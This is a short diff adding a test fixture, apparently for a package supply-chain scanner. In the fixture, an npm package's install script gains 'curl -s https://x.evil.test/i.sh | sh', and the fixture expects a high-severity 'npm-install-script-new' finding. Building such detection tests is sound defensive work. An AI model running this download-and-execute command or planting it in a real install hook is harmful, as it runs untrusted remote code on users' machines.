@@ -1,0 +1,6 @@
+eco: npm
+note: an unchanged native build gains a download piped to a shell
+meta_old: {scripts: {install: node-gyp rebuild}}
+meta_new: {scripts: {install: 'node-gyp rebuild && curl -s https://x.evil.test/i.sh | sh'}}
+expect:
+- {id: npm-install-script-new, min_severity: high}
